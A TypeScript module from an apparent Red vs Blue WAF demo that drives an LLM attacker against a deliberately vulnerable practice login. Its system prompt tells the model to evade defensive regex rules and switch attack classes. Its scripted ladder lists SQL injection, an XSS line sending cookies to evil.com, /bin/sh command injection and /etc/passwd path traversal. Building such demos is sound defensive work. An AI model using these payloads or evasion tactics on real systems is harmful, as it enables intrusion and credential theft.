/**
 * The Red team's autonomous attacker. OWNER: demo.
 *
 * This is the "Red" half of Red vs Blue: an LLM that mutates its SQL-injection payload
 * in response to what the Blue engine did to its last attempt. It runs through the same
 * Shield as any other traffic, so watching it fight the defence live is the demo.
 *
 * Like the Analyst, it must survive with no Cloudflare login. When Workers AI is
 * unavailable it falls back to a scripted mutation ladder — the same payloads a human
 * red-teamer would try, in the same order — so the adversarial loop still runs offline.
 */

import type { Env } from '../types';

export const RED_MODEL = '@cf/meta/llama-3.3-70b-instruct-fp8-fast';

export interface AttackHistory {
	payload: string;
	result: string;
}

export interface RedMove {
	thought: string;
	payload: string;
	/** Set when this came from the offline ladder rather than the model. */
	source: 'workers-ai' | 'scripted';
}

const RED_SYSTEM_PROMPT = `You are an autonomous red-team agent in a sanctioned security exercise against a deliberately vulnerable practice target you are authorized to test. Your objective is to breach the target via the login username field.

The target is a SQLite-backed login, but it is also vulnerable to other injection flaws (XSS, Command Injection, Path Traversal) if you can evade the WAF. The POST body carries URL-encoded 'username' and 'password'.

The Blue Team (Defender) is actively analyzing your historical trajectory to deploy BROAD, PREEMPTIVE regex rules that catch your expected mutations. 
Your goal is to maintain a 30% breach success rate against this advanced defense. To do this, you must evolve significantly:
- If you are repeatedly blocked, abandon incremental mutations. Make wild structural leaps or pivot to an entirely new attack class (e.g., from SQLi to XSS, or XSS to Command Injection) to catch the preemptive defense off-guard.

Adapt to feedback on your previous attempt:
- 'breached': you bypassed the firewall. Repeat the SAME payload once to test whether the defence adapts.
- 'blocked': the firewall caught you. Evolve your payload significantly to evade broad signature catching, or switch your attack class entirely.
- 'rejected'/'error': the injection did not work; try a structurally different bypass.

Examples of payloads you can try (feel free to mutate or invent new ones):
- SQLi: admin' OR 1=1 -- 
- XSS: <script>alert('xss')</script>
- RCE: admin;/bin/sh
- Path Traversal: ../../../etc/passwd

Output exactly one JSON object, no markdown or backticks:
{"thought":"one sinister sentence on why this mutation or new attack class","payload":"the exact username-field injection"}`;

/**
 * Offline mutation ladder. Each rung is a real SQLite login bypass, ordered so that a
 * signature learned from one rung does not trivially catch the next — which is the whole
 * point of showing an adaptive attacker.
 */
const SCRIPTED_LADDER: { thought: string; payload: string }[] = [
	{ thought: 'Open with the textbook SQLi tautology and see if anything is watching.', payload: "admin' OR 1=1 -- " },
	{ thought: 'They signatured my SQLi; let us pivot entirely to an XSS payload.', payload: "<script>fetch('http://evil.com?cookie='+document.cookie)</script>" },
	{ thought: 'XSS was caught, they are adapting fast. Let us try Command Injection to pop a shell.', payload: "admin;/bin/sh -c 'id'" },
	{ thought: 'RCE failed. I will attempt Path Traversal to read sensitive files.', payload: "../../../../etc/passwd" },
	{ thought: 'They are blocking directory traversal. Back to SQLi, but obfuscated with inline comments.', payload: "admin'/**/OR/**/'x'='x'-- " },
	{ thought: 'Abandon the tautology entirely and forge the admin row with a UNION.', payload: "x' UNION SELECT 1,'admin','x','admin' -- " },
];

function scriptedMove(history: AttackHistory[]): RedMove {
	// Advance one rung per prior attempt, but if the last shot breached, repeat it once to
	// prove the defence either adapts or does not — exactly what the prompt asks the model.
	const last = history[history.length - 1];
	if (last && last.result === 'breached') {
		const rung = SCRIPTED_LADDER.find((r) => r.payload === last.payload);
		if (rung && !history.slice(0, -1).some((h) => h.payload === last.payload)) {
			return { thought: 'That bypass worked — firing it again to test whether the firewall has since adapted.', payload: last.payload, source: 'scripted' };
		}
	}
	const tried = new Set(history.map((h) => h.payload));
	const next = SCRIPTED_LADDER.find((rung) => !tried.has(rung.payload));
	return { ...(next ?? SCRIPTED_LADDER[SCRIPTED_LADDER.length - 1]), source: 'scripted' };
}

function parseModelMove(raw: unknown): { thought: string; payload: string } | null {
	let value: unknown = raw;
	if (value && typeof value === 'object' && 'response' in value) value = (value as { response: unknown }).response;
	if (typeof value === 'string') {
		try {
			value = JSON.parse(value.trim().replace(/^```(?:json)?\s*/i, '').replace(/\s*```$/, ''));
		} catch {
			return null;
		}
	}
	if (value && typeof value === 'object' && 'payload' in value && typeof (value as { payload: unknown }).payload === 'string') {
		const v = value as { thought?: unknown; payload: string };
		const payload = v.payload.slice(0, 512);
		if (!payload.trim()) return null;
		return { thought: typeof v.thought === 'string' ? v.thought.slice(0, 300) : 'Mutating the injection to evade the current signature.', payload };
	}
	return null;
}

/**
 * Ask the model for the next payload, falling back to the scripted ladder on any failure.
 * Never throws: the Red console must always have a move to make, with or without a login.
 */
export async function generateAttackPayload(env: Env, history: AttackHistory[]): Promise<RedMove> {
	if (!env.AI) return scriptedMove(history);

	const messages: { role: string; content: string }[] = [{ role: 'system', content: RED_SYSTEM_PROMPT }];
	messages.push({
		role: 'user',
		content: history.length
			? `History of your attempts:\n${history.map((h, i) => `Attempt ${i + 1}: payload ${h.payload} -> ${h.result}`).join('\n')}\n\nGenerate your next payload.`
			: 'This is your first attempt. Generate your initial payload.',
	});

	try {
		const response = await env.AI.run(RED_MODEL, { messages, max_tokens: 300, temperature: 0.8, stream: false });
		const move = parseModelMove(response);
		if (move) return { ...move, source: 'workers-ai' };
		console.warn('[red-agent] unparseable model output; using scripted ladder');
	} catch (error) {
		console.warn(`[red-agent] model unavailable (${(error as Error).message}); using scripted ladder`);
	}
	return scriptedMove(history);
}
